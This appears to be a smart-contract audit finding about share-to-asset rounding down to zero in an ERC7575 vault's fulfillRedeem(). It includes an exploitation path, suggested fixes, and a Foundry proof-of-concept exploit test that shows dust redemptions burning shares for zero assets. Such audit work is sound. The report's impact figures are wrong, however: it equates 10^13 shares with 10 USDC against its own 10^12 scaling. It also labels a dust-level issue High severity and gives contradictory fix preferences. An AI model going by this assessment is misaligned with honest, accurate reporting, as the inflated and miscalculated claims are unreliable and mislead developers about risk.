## Title
Rounding Down to Zero in fulfillRedeem Causes Permanent Loss of User Funds and Breaks Reserved Asset Protection

## Summary
The `fulfillRedeem()` function in ERC7575VaultUpgradeable lacks validation for zero-asset conversions, allowing small share amounts (<10^12 shares for 6-decimal assets) to round down to 0 assets during share-to-asset conversion. This causes `totalClaimableRedeemAssets` to undercount reserved assets, enables over-investment, and results in permanent loss of user funds when those users attempt to redeem their shares.

## Impact
**Severity**: High

## Finding Description
**Location:** `src/ERC7575VaultUpgradeable.sol`, `fulfillRedeem()` function (lines 822-841), `redeem()` function (lines 885-918), and `totalAssets()` function (lines 1174-1180) [1](#0-0) 

**Intended Logic:** The `fulfillRedeem()` function should convert pending redemption shares to assets and properly track them in `totalClaimableRedeemAssets` to ensure sufficient liquidity is reserved for user withdrawals. The protocol's Reserved Asset Protection invariant requires that reserved assets are accurately accounted for to prevent over-investment.

**Actual Logic:** When `fulfillRedeem()` converts shares to assets using `_convertToAssets()`, small share amounts round down to 0 due to the scaling factor division (÷10^12 for 6-decimal assets). The function checks if shares are zero but does NOT check if the resulting assets are zero. This causes: [2](#0-1) 

1. `totalClaimableRedeemAssets` to be incremented by 0 (no reservation made)
2. `totalClaimableRedeemShares` to correctly track the shares
3. The reserved assets calculation in `totalAssets()` to undercount actual liabilities [3](#0-2) 

When users later call `redeem()` to claim these fulfilled requests, the proportional calculation results in 0 assets: [4](#0-3) 

The shares are burned but users receive 0 assets, resulting in permanent fund loss: [5](#0-4) 

**Exploitation Path:**
1. Attacker (or any user) calls `requestRedeem()` with small share amounts (<10^12 shares for USDC/6-decimal assets)
2. Investment Manager calls `fulfillRedeem()` for these requests
3. Conversion `_convertToAssets(10^11 shares, Floor)` = `10^11 / 10^12` = 0 assets (rounds down)
4. `totalClaimableRedeemAssets` remains 0, but `totalClaimableRedeemShares` tracks 10^11 shares
5. `totalAssets()` calculation undercounts reserved assets by the true value of these shares
6. Investment Manager can over-invest based on inflated `totalAssets()` availability [6](#0-5) 

7. User calls `redeem()` to claim shares: calculates `assets = shares.mulDiv(0, shares)` = 0 assets
8. Shares are burned, user receives 0 assets - permanent loss of value

**Security Property Broken:** 
- **Reserved Asset Protection**: The invariant "investedAssets + reservedAssets ≤ totalAssets" is violated because reserved assets are undercounted
- **No Fund Theft**: Users permanently lose their share value without compensation

## Impact Explanation
- **Affected Assets**: All 6-decimal assets (USDC, USDT) and any assets where share amounts < 10^(18-decimals+12) trigger rounding to 0
- **Damage Severity**: Users lose 100% of their share value for dust redemption requests. If exploited at scale (e.g., 100 requests of 10^11 shares each = 10^13 shares = 10 USDC), this represents significant cumulative loss
- **User Impact**: Any user who submits small redemption requests faces permanent fund loss. This could be accidental (legitimate small withdrawals) or intentional griefing where attackers sacrifice their own funds to break protocol accounting

## Likelihood Explanation
- **Attacker Profile**: Any user with shares can trigger this by requesting small redemptions. No special privileges required
- **Preconditions**: 
  - Asset must have low decimals (6-8 decimals most vulnerable)
  - User must request redemption of share amounts below 10^12 for 6-decimal assets
  - Investment Manager must fulfill these requests
- **Execution Complexity**: Single transaction per redemption request. Can be batched via `fulfillRedeems()` for multiple victims
- **Frequency**: Can be exploited repeatedly. Each dust redemption request creates the vulnerability

## Recommendation

Add validation in `fulfillRedeem()` to revert when asset conversion results in 0:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function fulfillRedeem, after line 831:

function fulfillRedeem(address controller, uint256 shares) public nonReentrant returns (uint256 assets) {
    VaultStorage storage $ = _getVaultStorage();
    if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
    if (shares == 0) revert ZeroShares();
    uint256 pendingShares = $.pendingRedeemShares[controller];
    if (shares > pendingShares) {
        revert ERC20InsufficientBalance(address(this), pendingShares, shares);
    }

    assets = _convertToAssets(shares, Math.Rounding.Floor);
    
    // FIXED: Add zero asset validation to prevent rounding loss
    if (assets == 0) revert ZeroAssets();  // <-- ADD THIS LINE

    $.pendingRedeemShares[controller] -= shares;
    $.claimableRedeemAssets[controller] += assets;
    $.claimableRedeemShares[controller] += shares;
    $.totalClaimableRedeemAssets += assets;
    $.totalClaimableRedeemShares += shares;

    return assets;
}
```

Alternative fix: Implement a minimum redemption share amount check in `requestRedeem()` to prevent dust requests from being submitted in the first place:

```solidity
// In src/ERC7575VaultUpgradeable.sol, function requestRedeem, after line 715:

function requestRedeem(uint256 shares, address controller, address owner) external nonReentrant returns (uint256 requestId) {
    if (shares == 0) revert ZeroShares();
    
    // FIXED: Add minimum share amount validation
    VaultStorage storage $ = _getVaultStorage();
    uint256 minShares = $.scalingFactor; // Minimum 1 asset worth of shares
    if (shares < minShares) revert InsufficientRedeemAmount(); // <-- ADD THIS CHECK
    
    // ... rest of function
}
```

## Proof of Concept

```solidity
// File: test/Exploit_RoundingLossFulfillRedeem.t.sol
// Run with: forge test --match-test test_RoundingLossFulfillRedeem -vvv

pragma solidity ^0.8.28;

import "forge-std/Test.sol";
import "../src/ERC7575VaultUpgradeable.sol";
import "../src/WERC7575ShareToken.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";

contract MockUSDC is ERC20 {
    constructor() ERC20("Mock USDC", "USDC") {}
    function decimals() public pure override returns (uint8) { return 6; }
    function mint(address to, uint256 amount) external { _mint(to, amount); }
}

contract Exploit_RoundingLossFulfillRedeem is Test {
    ERC7575VaultUpgradeable vault;
    WERC7575ShareToken shareToken;
    MockUSDC usdc;
    address owner = address(0x1);
    address user = address(0x2);
    address investmentManager = address(0x3);
    
    function setUp() public {
        // Deploy contracts
        usdc = new MockUSDC();
        shareToken = new WERC7575ShareToken(owner, address(0x4), address(0x5));
        
        vm.startPrank(owner);
        vault = new ERC7575VaultUpgradeable();
        vault.initialize(usdc, address(shareToken), owner);
        vault.setInvestmentManager(investmentManager);
        shareToken.registerVault(address(usdc), address(vault));
        vm.stopPrank();
        
        // Setup user with shares
        usdc.mint(user, 1000e6); // 1000 USDC
        vm.startPrank(user);
        usdc.approve(address(vault), type(uint256).max);
        shareToken.approveSelf(user, type(uint256).max);
        vm.stopPrank();
    }
    
    function test_RoundingLossFulfillRedeem() public {
        // SETUP: User deposits 1000 USDC and gets shares
        vm.prank(user);
        vault.requestDeposit(1000e6, user, user);
        
        vm.prank(investmentManager);
        vault.fulfillDeposit(user, 1000e6);
        
        vm.prank(user);
        vault.deposit(1000e6, user, user);
        
        uint256 userShares = shareToken.balanceOf(user);
        console.log("User shares:", userShares); // 1000e18
        
        // EXPLOIT: User requests redemption of 10^11 shares (dust amount)
        uint256 dustShares = 1e11; // Less than 10^12 threshold
        vm.prank(user);
        vault.requestRedeem(dustShares, user, user);
        
        // Investment manager fulfills - this rounds to 0 assets!
        vm.prank(investmentManager);
        uint256 assetsFromFulfill = vault.fulfillRedeem(user, dustShares);
        
        console.log("Assets from fulfill:", assetsFromFulfill); // Should be 0!
        
        // Check reserved assets undercounting
        (,,uint256 totalClaimableRedeemAssets,,,) = vault.getVaultMetrics();
        console.log("Total claimable redeem assets:", totalClaimableRedeemAssets);
        
        // VERIFY: User tries to redeem but gets 0 assets, shares are burned
        uint256 usdcBefore = usdc.balanceOf(user);
        uint256 sharesBefore = shareToken.balanceOf(address(vault));
        
        vm.prank(user);
        uint256 assetsReceived = vault.redeem(dustShares, user, user);
        
        uint256 usdcAfter = usdc.balanceOf(user);
        uint256 sharesAfter = shareToken.balanceOf(address(vault));
        
        console.log("Assets received by user:", assetsReceived);
        console.log("USDC balance change:", usdcAfter - usdcBefore);
        console.log("Shares burned:", sharesBefore - sharesAfter);
        
        assertEq(assetsReceived, 0, "Vulnerability confirmed: User received 0 assets");
        assertEq(usdcAfter - usdcBefore, 0, "Vulnerability confirmed: No USDC transferred");
        assertEq(sharesBefore - sharesAfter, dustShares, "Vulnerability confirmed: Shares were burned");
        assertEq(assetsFromFulfill, 0, "Vulnerability confirmed: Fulfill rounded to 0 assets");
        assertEq(totalClaimableRedeemAssets, 0, "Vulnerability confirmed: Reserved assets not tracked");
    }
}
```

## Notes

While the security question's premise contains inaccuracies (no `reservedAssets()` function exists, `pendingDepositRequest` returns assets not shares), the core concern about rounding-to-zero during share-to-asset conversion is valid and manifests in `fulfillRedeem()`. 

The vulnerability has two critical impacts:
1. **Direct user fund loss**: Users permanently lose share value when redeeming dust amounts
2. **Protocol accounting violation**: Under-counting of reserved assets enables over-investment, potentially leaving insufficient liquidity for legitimate redemptions

The fix is straightforward: add a zero-asset check in `fulfillRedeem()` or implement minimum share amount validation in `requestRedeem()`. The second approach is preferred as it prevents the issue at the source rather than during fulfillment.

### Citations

**File:** src/ERC7575VaultUpgradeable.sol (L822-841)
```text
    function fulfillRedeem(address controller, uint256 shares) public nonReentrant returns (uint256 assets) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if (shares == 0) revert ZeroShares();
        uint256 pendingShares = $.pendingRedeemShares[controller];
        if (shares > pendingShares) {
            revert ERC20InsufficientBalance(address(this), pendingShares, shares);
        }

        assets = _convertToAssets(shares, Math.Rounding.Floor);

        $.pendingRedeemShares[controller] -= shares;
        $.claimableRedeemAssets[controller] += assets;
        $.claimableRedeemShares[controller] += shares;
        $.totalClaimableRedeemAssets += assets;
        $.totalClaimableRedeemShares += shares; // Track shares that will be burned

        // Note: Shares are NOT burned here - they will be burned during redeem/withdraw claim
        return assets;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L895-897)
```text
        // Calculate proportional assets for the requested shares
        uint256 availableAssets = $.claimableRedeemAssets[controller];
        assets = shares.mulDiv(availableAssets, availableShares, Math.Rounding.Floor);
```

**File:** src/ERC7575VaultUpgradeable.sol (L912-917)
```text
        ShareTokenUpgradeable($.shareToken).burn(address(this), shares);

        emit Withdraw(msg.sender, receiver, controller, assets, shares);
        if (assets > 0) {
            SafeTokenTransfers.safeTransfer($.asset, receiver, assets);
        }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1174-1180)
```text
    function totalAssets() public view virtual returns (uint256) {
        VaultStorage storage $ = _getVaultStorage();
        uint256 balance = IERC20Metadata($.asset).balanceOf(address(this));
        // Exclude pending deposits, pending/claimable cancelation deposits, and claimable withdrawals from total assets
        uint256 reservedAssets = $.totalPendingDepositAssets + $.totalClaimableRedeemAssets + $.totalCancelDepositAssets;
        return balance > reservedAssets ? balance - reservedAssets : 0;
    }
```

**File:** src/ERC7575VaultUpgradeable.sol (L1448-1457)
```text
    function investAssets(uint256 amount) external nonReentrant returns (uint256 shares) {
        VaultStorage storage $ = _getVaultStorage();
        if (msg.sender != $.investmentManager) revert OnlyInvestmentManager();
        if ($.investmentVault == address(0)) revert NoInvestmentVault();
        if (amount == 0) revert ZeroAmount();

        uint256 availableBalance = totalAssets();
        if (amount > availableBalance) {
            revert ERC20InsufficientBalance(address(this), availableBalance, amount);
        }
```
